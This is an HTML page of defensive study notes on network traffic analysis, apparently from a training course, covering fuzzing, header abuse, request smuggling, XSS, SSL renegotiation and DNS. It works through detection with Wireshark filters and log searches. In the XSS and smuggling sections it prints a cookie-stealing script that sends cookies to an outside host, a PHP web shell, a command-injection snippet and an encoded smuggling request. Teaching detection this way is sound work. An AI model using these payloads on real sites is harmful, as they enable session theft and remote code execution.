<h2 id="preventing-icmp-tunneling">Preventing ICMP Tunneling</h2>
<ul>
<li>In order to prevent ICMP tunneling from occurring we can conduct the following actions.</li>
</ul>
<ol>
<li><code>Block ICMP Requests</code>—Simply, if ICMP is not allowed, attackers will not be able to utilize it.</li>
<li><code>Inspect ICMP Requests and Replies for Data</code>—Stripping data, or inspecting data for malicious content on these requests and replies can allow us better insight into our environment, and the ability to prevent this data exfiltration.</li>
</ol>
<hr>
<h1 id="httphttps-service-enumeration">HTTP/HTTPs Service Enumeration</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>basic_fuzzing.pcapng</code>.</p>
</li>
<li>
<p>Unusual web server traffic often indicates malicious activity, we might see that one host is generating excessive traffic with HTTP or HTTPs.</p>
</li>
<li>
<p>Attackers frequently target the transport layer via HTTP or HTTPS to exploit application vulnerabilities.</p>
</li>
<li>
<p>Recognizing attacker reconnaissance (or information gathering), exploitation, and abuse techniques is crucial for web server security.</p>
</li>
<li>
<p>Generally speaking, we can detect and identify fuzzing attempts through the following:</p>
<ol>
<li><code>Excessive HTTP/HTTPs traffic from one host</code></li>
<li><code>Referencing our web server's access logs for the same behavior</code></li>
</ol>
</li>
<li>
<p>Attackers often fuzz servers for reconnaissance (to gather information) before launching attacks.</p>
</li>
<li>
<p>While a <code>Web Application Firewall</code> might prevent this, internal servers may lack such protection.</p>
</li>
</ul>
<h2 id="finding-directory-fuzzing">Finding Directory Fuzzing</h2>
<ul>
<li>
<p>Directory fuzzing is used by attackers to find all possible web pages and locations in our web applications.</p>
</li>
<li>
<p>We can find this during our traffic analysis by limiting our Wireshark view to only http traffic.</p>
</li>
<li>
<p><code>http</code>
<img src="/Network%20Traffic%20Analysis/2-HTTP-Enum.png" alt="2-HTTP-Enum"></p>
</li>
<li>
<p>Secondarily, if we wanted to remove the responses from our server, we could simply specify <code>http.request</code>
<img src="/Network%20Traffic%20Analysis/3-HTTP-Enum.png" alt="3-HTTP-Enum"></p>
</li>
<li>
<p>Directory fuzzing is quite simple to detect, as it will in most cases show the following signs</p>
<ol>
<li><code>A host will repeatedly attempt to access files on our web server which do not exist (response 404)</code>.</li>
<li><code>A host will send these in rapid succession</code>.</li>
</ol>
</li>
<li>
<p>We can also always reference this traffic within our access logs on our web server.</p>
</li>
<li>
<p>For Apache this would look like the following two examples.</p>
</li>
<li>
<p>To use grep, we could filter like so:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat access.log | grep <span style="color:#e6db74">&#34;192.168.10.5&#34;</span>
</span></span></code></pre></div><pre tabindex="0"><code>192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /randomfile1 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /frand2 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bash_history HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bashrc HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cache HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.config HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvs HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvsignore HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.forward HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
...SNIP...
</code></pre><ul>
<li>And to use <code>awk</code>, we could do the following</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat access.log | awk <span style="color:#e6db74">&#39;$1 == &#34;192.168.10.5&#34;&#39;</span>
</span></span></code></pre></div><pre tabindex="0"><code>192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /randomfile1 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /frand2 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bash_history HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bashrc HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cache HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.config HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvs HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvsignore HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.forward HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.git/HEAD HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.history HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.hta HTTP/1.1&#34; 403 438 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
...SNIP...
</code></pre><h2 id="finding-other-fuzzing-techniques">Finding Other Fuzzing Techniques</h2>
<ul>
<li>
<p>Attackers may also fuzz web servers:</p>
<ul>
<li>By Targeting dynamic or static elements like ID fields.</li>
<li>Or by seeking IDOR vulnerabilities, particularly in JSON parsing (changing <code>return=max</code> to <code>return=min</code>).</li>
</ul>
</li>
<li>
<p>To limit traffic to just one host we can employ the following filter:</p>
</li>
</ul>
<pre tabindex="0"><code>http.request and ((ip.src_host == &lt;suspected IP&gt;) or (ip.dst_host == &lt;suspected IP&gt;))
</code></pre><p><img src="/Network%20Traffic%20Analysis/4-HTTP-Enum.png" alt="4-HTTP-Enum"></p>
<ul>
<li>
<p>Secondarily, we can always build an overall picture by right clicking any of these requests, going to follow, and follow HTTP stream.
<img src="/Network%20Traffic%20Analysis/4a-HTTP-Enum.png" alt="4a-HTTP-Enum"></p>
</li>
<li>
<p>A rapid succession of requests suggests a fuzzing attempt, warranting further investigation of the host.</p>
</li>
<li>
<p>However sometimes attackers will do the following to prevent detection:</p>
<ol>
<li><code>Stagger these responses across a longer period of time.</code></li>
<li><code>Send these responses from multiple hosts or source addresses.</code></li>
</ol>
</li>
</ul>
<h2 id="preventing-fuzzing-attempts">Preventing Fuzzing Attempts</h2>
<ul>
<li>We can aim to prevent fuzzing attempts from adversaries by conducting the following actions.</li>
</ul>
<ol>
<li><code>Maintain our virtualhost or web access configurations to return the proper response codes to throw off these scanners.</code></li>
<li><code>Establish rules to prohibit these IP addresses from accessing our server through our web application firewall.</code></li>
</ol>
<hr>
<h1 id="strange-http-headers">Strange HTTP Headers</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>CRLF_and_host_header_manipulation.pcapng</code>.</p>
</li>
<li>
<p>When analyzing our web server&rsquo;s traffic, we may not immediately detect fuzzing attempts when analyzing our web server&rsquo;s traffic.</p>
</li>
<li>
<p>However, this doesn&rsquo;t guarantee that malicious activity isn&rsquo;t occurring.</p>
</li>
<li>
<p>To investigate further, we can examine HTTP requests for unusual patterns.</p>
</li>
<li>
<p>Some of which are weird headers like:</p>
<ol>
<li><code>Weird Hosts (Host: )</code></li>
<li><code>Unusual HTTP Verbs</code></li>
<li><code>Changed User Agents</code></li>
</ol>
</li>
</ul>
<h2 id="finding-strange-host-headers">Finding Strange Host Headers</h2>
<ul>
<li>
<p>In order to start, as we would normally do, we can limit our view in Wireshark to only http replies and requests.</p>
</li>
<li>
<p><code>http</code>
<img src="/Network%20Traffic%20Analysis/1-http-headers.png" alt="1-http-headers"></p>
</li>
<li>
<p>To identify irregular Host headers, use the following command, specifying your web server&rsquo;s real IP address (or domain name for external servers) to exclude legitimate entries.</p>
</li>
<li>
<p><code>http.request and (!(http.host == &quot;192.168.10.7&quot;))</code>
<img src="/Network%20Traffic%20Analysis/2-http-headers.png" alt="2-http-headers"></p>
</li>
<li>
<p>Suppose we noticed that this filter returned some results, we could dig into these HTTP requests a little deeper to find out what hosts these bad actors might have tried to use.</p>
</li>
<li>
<p>We might commonly notice <code>127.0.0.1</code>.
<img src="/Network%20Traffic%20Analysis/3-http-headers.png" alt="3-http-headers"></p>
</li>
<li>
<p>Or instead something like admin.
<img src="/Network%20Traffic%20Analysis/4-http-headers.png" alt="4-http-headers"></p>
</li>
<li>
<p>Attackers will attempt to use different host headers to gain levels of access they would not normally achieve through the legitimate host.</p>
</li>
<li>
<p>They may use proxy tools like burp suite or others to modify these before sending them to the server.</p>
</li>
<li>
<p>In order to prevent successful exploitation beyond only detecting these events, we should always do the following.</p>
</li>
</ul>
<ol>
<li><code>Ensure that our virtualhosts or access configurations are setup correctly to prevent this form of access.</code></li>
<li><code>Ensure that our web server is up to date.</code></li>
</ol>
<h2 id="analyzing-code-400s-and-request-smuggling">Analyzing Code 400s and Request Smuggling</h2>
<ul>
<li>
<p>We might also notice some bad responses from our web server, like code 400s.</p>
</li>
<li>
<p>These codes indicate a bad request from the client, so they can be a good place to start when detecting malicious actions via http/https.</p>
</li>
<li>
<p>In order to filter for these, we can use the following</p>
</li>
<li>
<p><code>http.response.code == 400</code>
<img src="/Network%20Traffic%20Analysis/6-http-headers.png" alt="6-http-headers"></p>
</li>
<li>
<p>Suppose we were to follow one of these HTTP streams, we might notice the following from the client.
<img src="/Network%20Traffic%20Analysis/5-http-headers.png" alt="5-http-headers"></p>
</li>
<li>
<p>This is commonly referred to as HTTP request smuggling or CRLF (Carriage Return Line Feed). Essentially, an attacker will try the following.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5
</span></span></code></pre></div><ul>
<li>Which will be decoded by our server like this.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /login.php?id=1 <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">192.168.10.5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GET /uploads/cmd2.php HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 127.0.0.1:8080
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 192.168.10.5
</span></span></code></pre></div><ul>
<li>Essentially, in cases where our configurations are vulnerable, the first request will go through, and the second request will as well shortly after.</li>
<li>This can give an attacker levels of access that we would normally prohibit.</li>
<li>This occurs due to our configuration looking like the following.</li>
</ul>
<h2 id="apache-configuration">Apache Configuration</h2>
<pre tabindex="0"><code>&lt;VirtualHost *:80&gt;

    RewriteEngine on
    RewriteRule &#34;^/categories/(.*)&#34; &#34;http://192.168.10.100:8080/categories.php?id=$1&#34; [P]
    ProxyPassReverse &#34;/categories/&#34; &#34;http://192.168.10.100:8080/&#34;

&lt;/VirtualHost&gt;
</code></pre><p><a href="https://github.com/dhmosfunk/CVE-2023-25690-POC">CVE-2023-25690</a></p>
<ul>
<li>As such watching for these code 400s can give clear indication to adversarial actions during our traffic analysis efforts.</li>
<li>Additionally, we would notice if an attacker is successful with this attack by finding the code <code>200</code> (<code>success</code>) in response to one of the requests which look like this.</li>
</ul>
<hr>
<h1 id="cross-site-scripting-xss--code-injection-detection">Cross-Site Scripting (XSS) &amp; Code Injection Detection</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>XSS_Simple.pcapng</code>.</p>
</li>
<li>
<p>Suppose we were looking through our HTTP requests and noticed that a good amount of requests were being sent to an internal &ldquo;server&rdquo;, we did not recognize.</p>
</li>
<li>
<p>This could be a clear indication of cross-site scripting. Let&rsquo;s take the following output for example.
<img src="/Network%20Traffic%20Analysis/1-XSS.png" alt="1-XSS"></p>
</li>
<li>
<p>In real-world scenarios, user cookies/tokens transmitted may not be obvious, often being encoded or encrypted</p>
</li>
<li>
<p>Cross-site scripting (XSS) occurs when an attacker injects malicious JavaScript code into a webpage via user input.</p>
</li>
<li>
<p>When other users visit the server, their browsers execute this injected code, allowing attackers to steal tokens, cookies, session values, and other sensitive data.</p>
</li>
<li>
<p>If we were to follow one of these requests it would look like the following.
<img src="/Network%20Traffic%20Analysis/2-XSS_.png" alt="2-XSS_"></p>
</li>
<li>
<p>Getting down to the root of where this code is originating can be somewhat tricky.</p>
</li>
<li>
<p>However, suppose we had a user comment area on our web server.</p>
</li>
<li>
<p>We might notice one of the comments looks like the following.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.0.19:5555&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cookie=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(document.<span style="color:#a6e22e">cookie</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">params</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><ul>
<li>
<p>Successful cross-site scripting would necessitate immediate removal of the comment and, in most cases, server downtime to fix the issue before it persists.</p>
</li>
<li>
<p>Attackers may attempt to inject code into these fields, as demonstrated in the following examples.</p>
</li>
<li>
<p>In order for them to get command and control through PHP.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>Or to execute a single command with PHP:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">`whoami`</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h4 id="preventing-xss-and-code-injection">Preventing XSS and Code Injection</h4>
<ul>
<li>In order to prevent these threats after we detect them, we can do the following.</li>
</ul>
<ol>
<li><code>Sanitize and handle user input in an acceptable manner.</code></li>
<li><code>Do not interpret user input as code.</code></li>
</ol>
<hr>
<h1 id="ssl-renegotiation-attacks">SSL Renegotiation Attacks</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>SSL_renegotiation_edited.pcapng</code>.</p>
</li>
<li>
<p>Although HTTP traffic is unencrypted, we sometimes will run into encrypted HTTPs traffic.</p>
</li>
<li>
<p>As such, knowing the indicators and signs of malicious HTTPs traffic is crucial to our traffic analysis efforts.</p>
</li>
</ul>
<h2 id="https-breakdown">HTTPs Breakdown</h2>
<ul>
<li>
<p>Unlike HTTP, which is a stateless protocol, HTTPs incorporates encryption to provide security for web servers and clients.</p>
</li>
<li>
<p>It does so with the following.</p>
<ol>
<li><code>Transport Layer Security (Transport Layer Security)</code></li>
<li><code>Secure Sockets Layer (SSL)</code></li>
</ol>
</li>
<li>
<p>Generally speaking, when a client establishes a HTTPs connection with a server, it conducts the following.</p>
</li>
</ul>
<ol>
<li><code>Handshake</code>—When establishing an HTTPs connection, Server &amp; Client undergo a Handshake. During an HTTPS handshake, the client and server negotiate which encryption algorithms to use and exchange their certificates.</li>
<li><code>Encryption</code>—Upon completion of the handshake, the client and the server use the prior agreed upon encryption algorithm to encrypt further data communicated between them.</li>
<li><code>Further Data Exchange</code>—Once the encrypted connection is established, the client and the server will continue to exchange data between each other. This data could be web pages, images, or other web resources.</li>
<li><code>Decryption</code>—When the client transmits to the server, or the server transmits to the client, they must decrypt this data with the private and public keys.</li>
</ol>
<ul>
<li>
<p>As such, one of the more common HTTPs based attacks are <em><strong>SSL renegotiation</strong></em>, in which an attacker will negotiate the session to the lowest possible encryption standard.</p>
</li>
<li>
<p>However there are other encryption attacks we should be aware of like the <code>heartbleed vulnerability</code>—<a href="https://heartbleed.com/">The Heartbleed Vulnerability CVE-2014-0160</a>.</p>
</li>
</ul>
<h2 id="tls-and-ssl-handshakes">TLS and SSL Handshakes</h2>
<ul>
<li>
<p>In order to establish an encrypted connection, the client and server must undergo the handshake process.</p>
</li>
<li>
<p>Fortunately for us, TLS and SSL handshakes are mostly similar in their steps.
<img src="/Network%20Traffic%20Analysis/tls-ssl-handshake.png" alt="tls-ssl-handshake"></p>
</li>
<li>
<p>To break it down further, we might observe the following occur during our traffic analysis efforts.</p>
</li>
</ul>
<ol>
<li><code>Client Hello</code>—First initial step, the client sends a hello message to the server, specifying supported TLS/SSL versions, cipher suites (aka encryption algorithms), and random data (nonces) for subsequent steps.</li>
<li><code>Server Hello</code>—Responding to the client Hello, the server will send a Server Hello message. This message includes the server&rsquo;s chosen TLS/SSL version, its selected cipher suite from the client&rsquo;s choices, and an additional nonce.</li>
<li><code>Certificate Exchange</code>—The server then sends its digital certificate to the client, proving its identity. This certificate includes the server&rsquo;s public key, which the client will use to conduct the key exchange process.</li>
<li><code>Key Exchange</code>—The client then generates what is referred to as the premaster secret. It then encrypts this secret using the server&rsquo;s public key from the certificate and sends it on to the server.</li>
<li><code>Session Key Derivation</code>—The client and server use exchanged nonces and the premaster secret to compute session keys, which then enable symmetric encryption and decryption for secure communication/connection.</li>
<li><code>Finished Messages</code>—To verify handshake completion and ensure both parties derived the same session keys, the client and server exchange finished messages. These messages contain a hash of all previous handshake messages, encrypted using the session keys.</li>
<li><code>Secure Data Exchange</code>—Now that the handshake is complete, the client and the server can now exchange data over the encrypted channel.</li>
</ol>
<ul>
<li>We can also look at this from a general algorithmic perspective.</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Handshake Step</strong></th>
          <th><strong>Relevant Calculations</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>Client Hello</code></td>
          <td><code>ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }</code></td>
      </tr>
      <tr>
          <td><code>Server Hello</code></td>
          <td><code>ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod</code> }</td>
      </tr>
      <tr>
          <td><code>Certificate Exchange</code></td>
          <td><code>ServerCertificate = { ServerPublicCertificate }</code></td>
      </tr>
      <tr>
          <td><code>Key Exchange</code></td>
          <td>- <code>ClientDHPrivateKey</code><!-- raw HTML omitted -->- <code>ClientDHPublicKey = DH_KeyGeneration(ClientDHPrivateKey)</code><!-- raw HTML omitted -->- <code>ClientKeyExchange = { ClientDHPublicKey }</code><!-- raw HTML omitted -->- <code>ServerDHPrivateKey</code><!-- raw HTML omitted -->- <code>ServerDHPublicKey = DH_KeyGeneration(ServerDHPrivateKey)</code><!-- raw HTML omitted -->- <code>ServerKeyExchange = { ServerDHPublicKey }</code></td>
      </tr>
      <tr>
          <td><code>Premaster Secret</code></td>
          <td>- <code>PremasterSecret = DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)</code><!-- raw HTML omitted -->- <code>PremasterSecret = DH_KeyAgreement(ClientDHPublicKey, ServerDHPrivateKey)</code></td>
      </tr>
      <tr>
          <td><code>Session Key Derivation</code></td>
          <td><code>MasterSecret = PRF(PremasterSecret, &quot;master secret&quot;, ClientNonce + ServerNonce</code>)</td>
      </tr>
      <tr>
          <td></td>
          <td><code>KeyBlock = PRF(MasterSecret, &quot;key expansion&quot;, ServerNonce + ClientNonce)</code></td>
      </tr>
      <tr>
          <td><code>Extraction of Session Keys</code></td>
          <td>- <code>ClientWriteMACKey = First N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ServerWriteMACKey = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ClientWriteKey = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ServerWriteKey = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ClientWriteIV = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ServerWriteIV = Next N bytes of KeyBlock</code></td>
      </tr>
      <tr>
          <td><code>Finished Messages</code></td>
          <td><code>FinishedMessage = PRF(MasterSecret, &quot;finished&quot;, Hash(ClientHello + ServerHello))</code></td>
      </tr>
  </tbody>
</table>
<h2 id="diving-into-ssl-renegotiation-attacks">Diving into SSL Renegotiation Attacks</h2>
<ul>
<li>
<p>In order to find irregularities in handshakes, we can utilize TCP dump and Wireshark as we have done before.</p>
</li>
<li>
<p>In order to filter to only handshake messages we can use this filter in Wireshark.</p>
</li>
<li>
<p><code>ssl.record.content_type == 22</code></p>
</li>
<li>
<p>The content type 22 specifies handshake messages only.</p>
</li>
<li>
<p>Specifying this filter we should get a view like the following.
<img src="/Network%20Traffic%20Analysis/1-HTTPs.png" alt="1-HTTPs"></p>
</li>
</ul>
<p>When we are looking for SSL renegotiation attacks, we can look for the following.</p>
<ol>
<li><code>Multiple Client Hellos</code>—Multiple client hellos from a single client within a short period indicate a potential SSL renegotiation attack, where the attacker repeatedly triggers renegotiation to downgrade the cipher suite.</li>
<li><code>Out of Order Handshake Messages</code>—Out-of-order traffic can occur due to packet loss, but in SSL renegotiation, a server receiving a client hello after handshake completion is a key indicator.</li>
</ol>
<ul>
<li>An attacker might conduct this attack against us for the following reasons</li>
</ul>
<ol>
<li><code>Denial of Service</code>—SSL renegotiation attacks consume a ton of resources on the server side, and as such it might overwhelm the server and cause it to be unresponsive.</li>
<li><code>SSL/TLS Weakness Exploitation</code>—The attacker might attempt renegotiation to potentially exploit vulnerabilities with our current implementation of cipher suites.</li>
<li><code>Cryptanalysis</code>—The attacker might use renegotiation as a part of an overall strategy to analyze our SSL/TLS patterns for other systems.</li>
</ol>
<hr>
<h1 id="peculiar-dns-traffic">Peculiar DNS Traffic</h1>
<ul>
<li>
<p>Peculiar == غَيْرُ مَأْلُوف.</p>
</li>
<li>
<p>DNS Traffic can be cumbersome (مرهق) to inspect, as many times our clients will generate a ton of it, and abnormalities can sometimes get buried in the mass volume of it.</p>
</li>
<li>
<p>However, understanding DNS and some direct signs of malicious actions is important in our traffic analysis efforts.</p>
</li>
</ul>
<h2 id="dns-queries">DNS Queries</h2>
<ul>
<li>
<p>DNS queries are used when a client wants to resolve a domain name with an IP address, or the other way around.</p>
</li>
<li>
<p>First, we can explore the most common type of query, which is forward lookups.
<img src="/Network%20Traffic%20Analysis/DNS_forward_queries.jpg" alt="DNS_forward_queries"></p>
</li>
<li>
<p>Generally speaking, when a client initiates a DNS forward lookup query, it does the following steps.</p>
</li>
<li>
<p>Request:</p>
<ul>
<li><code>Where is academy.hackthebox.com?</code></li>
</ul>
</li>
<li>
<p>Response:</p>
<ul>
<li><code>Well its at 192.168.10.6</code></li>
</ul>
</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Step</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>1. Query Initiation</code></td>
          <td>When the user wants to visit something like <code>academy.hackthebox.com</code> it initiates a DNS forward query.</td>
      </tr>
      <tr>
          <td><code>2. Local Cache Check</code></td>
          <td>The client then checks its local DNS cache to see if it has already resolved the domain name to an IP address. If not it continues with the following.</td>
      </tr>
      <tr>
          <td><code>3. Recursive Query</code></td>
          <td>The client then sends its recursive query to its configured DNS server (local or remote).</td>
      </tr>
      <tr>
          <td><code>4. Root Servers</code></td>
          <td>The DNS resolver, if necessary, starts by querying the root name servers to find the authoritative name servers for the top-level domain (TLD). There are 13 root servers distributed worldwide.</td>
      </tr>
      <tr>
          <td><code>5. TLD Servers</code></td>
          <td>The root server then responds with the authoritative name servers for the TLD (aka <code>.com</code> or <code>.org</code>)</td>
      </tr>
      <tr>
          <td><code>6. Authoritative Servers</code></td>
          <td>The DNS resolver then queries the TLD&rsquo;s authoritative name servers for the second-level domain (aka <code>hackthebox.com</code>).</td>
      </tr>
      <tr>
          <td><code>7. Domain Name's Authoritative Servers</code></td>
          <td>Finally, the DNS resolver queries the domains authoritative name servers to obtain the IP address associated with the requested domain name (aka <code>academy.hackthebox.com</code>).</td>
      </tr>
      <tr>
          <td><code>8. Response</code></td>
          <td>The DNS resolver then receives the IP address (A or AAAA record) and sends it back to the client that initiated the query.</td>
      </tr>
  </tbody>
</table>
<h4 id="dns-reverse-lookupsqueries">DNS Reverse Lookups/Queries</h4>
<ul>
<li>
<p>On the opposite side, we have Reverse Lookups.</p>
</li>
<li>
<p>These occur when a client already knows the IP address and wants to find the corresponding FQDN (Fully Qualified Domain Name).</p>
</li>
<li>
<p>Request:</p>
<ul>
<li><code>What is your name 192.168.10.6?</code></li>
</ul>
</li>
<li>
<p>Response:</p>
<ul>
<li><code>Well its academy.hackthebox.com :)</code></li>
</ul>
</li>
<li>
<p>In this case the steps are a bit less complicated.</p>
</li>
</ul>
<table>
  <thead>
